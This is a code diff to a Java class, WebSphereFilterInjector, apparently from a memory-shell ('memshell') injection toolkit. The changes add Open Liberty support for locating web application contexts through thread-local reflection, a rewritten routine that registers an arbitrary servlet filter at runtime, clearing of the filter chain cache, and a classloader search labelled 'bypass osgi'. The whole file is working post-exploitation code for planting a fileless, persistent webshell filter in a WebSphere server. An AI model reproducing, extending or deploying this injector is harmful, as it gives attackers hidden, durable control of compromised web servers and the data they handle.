@@ -1,6 +1,5 @@
 package com.reajason.javaweb.memshell.injector.websphere;
 
-import javax.servlet.Filter;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -14,9 +13,6 @@ import java.util.zip.GZIPInputStream;
 
 
 /**
- * tested v7、v8
- * update  2023/07/08
- *
  * @author ReaJason
  */
 public class WebSphereFilterInjector {
@@ -46,7 +42,7 @@ public class WebSphereFilterInjector {
         } catch (Throwable throwable) {
             msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts == null) {
+        if (contexts == null || contexts.isEmpty()) {
             msg += "context not found";
         } else {
             for (Object context : contexts) {
@@ -87,11 +83,32 @@ public class WebSphereFilterInjector {
      */
     public Set<Object> getContext() throws Exception {
         Set<Object> contexts = new HashSet<Object>();
-        Object[] wsThreadLocals = (Object[]) getFieldValue(Thread.currentThread(), "wsThreadLocals");
-        for (Object wsThreadLocal : wsThreadLocals) {
+        Object[] threadLocals = null;
+        boolean raw = false;
+        try {
+            // WebSphere Liberty
+            threadLocals = (Object[]) getFieldValue(Thread.currentThread(), "wsThreadLocals");
+        } catch (NoSuchFieldException ignored) {
+        }
+        if (threadLocals == null) {
+            // Open Liberty
+            threadLocals = (Object[]) getFieldValue(getFieldValue(Thread.currentThread(), "threadLocals"), "table");
+            raw = true;
+        }
+        for (Object threadLocal : threadLocals) {
+            if (threadLocal == null) {
+                continue;
+            }
+            Object value = threadLocal;
+            if (raw) {
+                value = getFieldValue(threadLocal, "value");
+            }
+            if (value == null) {
+                continue;
+            }
             // for websphere 7.x
-            if (wsThreadLocal != null && wsThreadLocal.getClass().getName().endsWith("FastStack")) {
-                Object[] stackList = (Object[]) getFieldValue(wsThreadLocal, "stack");
+            if (value.getClass().getName().endsWith("FastStack")) {
+                Object[] stackList = (Object[]) getFieldValue(value, "stack");
                 for (Object stack : stackList) {
                     try {
                         Object config = getFieldValue(stack, "config");
@@ -99,8 +116,9 @@ public class WebSphereFilterInjector {
                     } catch (Exception ignored) {
                     }
                 }
-            } else if (wsThreadLocal != null && wsThreadLocal.getClass().getName().endsWith("WebContainerRequestState")) {;
-                contexts.add(getFieldValue(getFieldValue(getFieldValue(getFieldValue(getFieldValue(wsThreadLocal, "currentThreadsIExtendedRequest"), "_dispatchContext"), "_webapp"), "facade"), "context"));
+            } else if (value.getClass().getName().endsWith("WebContainerRequestState")) {
+                Object webApp = invokeMethod(getFieldValue(getFieldValue(value, "currentThreadsIExtendedRequest"), "_dispatchContext"), "getWebApp", null, null);
+                contexts.add(getFieldValue(getFieldValue(webApp, "facade"), "context"));
             }
         }
         return contexts;
@@ -132,48 +150,49 @@ public class WebSphereFilterInjector {
 
     @SuppressWarnings("unchecked")
     public void inject(Object context, Object filter) throws Exception {
-        Object webAppConfiguration = getFieldValue(context, "config");
-        if (invokeMethod(webAppConfiguration, "getFilterInfo", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
+        Object webAppConfig = getFieldValue(context, "config");
+        if (invokeMethod(webAppConfig, "getFilterInfo", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
             return;
         }
 
-        ClassLoader classLoader = context.getClass().getClassLoader();
-        Class<?> filterMappingClass = classLoader.loadClass("com.ibm.ws.webcontainer.filter.FilterMapping");
-        Class<?> iFilterConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.filter.IFilterConfig");
-        Class<?> iServletConfigClass = classLoader.loadClass("com.ibm.wsspi.webcontainer.servlet.IServletConfig");
+        Class<?> filterMappingClass = loadClass(context.getClass(), "com.ibm.ws.webcontainer.filter.FilterMapping");
+        Class<?> iFilterConfigClass = loadClass(context.getClass(), "com.ibm.wsspi.webcontainer.filter.IFilterConfig");
+        Class<?> iServletConfigClass = loadClass(context.getClass(), "com.ibm.wsspi.webcontainer.servlet.IServletConfig");
 
         Object filterManager = getFieldValue(context, "filterManager");
-        try {
-            // v8
-            Constructor<?> constructor = filterMappingClass.getConstructor(String.class, iFilterConfigClass, iServletConfigClass);
-            // com.ibm.ws.webcontainer.webapp.WebApp.commonAddFilter
-            setFieldValue(context, "initialized", false);
-            Object filterConfig = invokeMethod(context, "commonAddFilter", new Class[]{String.class, String.class, Filter.class, Class.class}, new Object[]{getClassName(), getClassName(), filter, filter.getClass()});
-            Object filterMapping = constructor.newInstance(getUrlPattern(), filterConfig, null);
-            setFieldValue(context, "initialized", true);
+        Object filterConfig = invokeMethod(context, "createFilterConfig", new Class[]{String.class}, new Object[]{getClassName()});
+        invokeMethod(filterConfig, "setFilterClassName", new Class[]{String.class}, new Object[]{getClassName()});
+        setFieldValue(filterConfig, "name", getClassName());
+        Constructor<?> constructor = filterMappingClass.getConstructor(String.class, iFilterConfigClass, iServletConfigClass);
+        Object filterMapping = constructor.newInstance(getUrlPattern(), filterConfig, null);
+        invokeMethod(filterManager, "addFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMapping});
+        invokeMethod(webAppConfig, "addFilterInfo", new Class[]{iFilterConfigClass}, new Object[]{filterConfig});
 
-            // com.ibm.ws.webcontainer.filter.WebAppFilterManager.addFilterMapping
-            invokeMethod(filterManager, "addFilterMapping", new Class[]{filterMappingClass}, new Object[]{filterMapping});
-
-            // com.ibm.ws.webcontainer.filter.WebAppFilterManager#_loadFilter
-            invokeMethod(filterManager, "_loadFilter", new Class[]{String.class}, new Object[]{getClassName()});
-
-        } catch (Exception e) {
-            // v7
-            Object filterConfig = invokeMethod(context, "createFilterConfig", new Class[]{String.class}, new Object[]{getClassName()});
-            invokeMethod(filterConfig, "setFilterClassName", new Class[]{String.class}, new Object[]{filter.getClass().getName()});
-            setFieldValue(filterConfig, "dispatchMode", new int[]{0});
-            setFieldValue(filterConfig, "name", getClassName());
-            invokeMethod(context, "addMappingFilter", new Class[]{String.class, iFilterConfigClass}, new Object[]{getUrlPattern(), filterConfig});
-            invokeMethod(filterManager, "_loadFilter", new Class[]{String.class}, new Object[]{getClassName()});
-        }
         // 清除缓存
-        invokeMethod(getFieldValue(filterManager, "chainCache"), "clear", null, null);
+        Object chainCache = getFieldValue(filterManager, "chainCache");
+        try {
+            invokeMethod(chainCache, "clear", null, null);
+        } catch (Exception e) {
+            invokeMethod(getFieldValue(chainCache, "chainCacheMap"), "clear", null, null);
+        }
     }
 
     @Override
     public String toString() {
         return msg;
+    }
+
+    // bypass osgi
+    public static Class<?> loadClass(Class<?> context, String className) throws ClassNotFoundException {
+        if (context.equals(Object.class)) {
+            throw new ClassNotFoundException(className);
+        }
+        ClassLoader loader = context.getClassLoader();
+        try {
+            return loader.loadClass(className);
+        } catch (ClassNotFoundException e) {
+            return loadClass(context.getSuperclass(), className);
+        }
     }
 
     @SuppressWarnings("all")
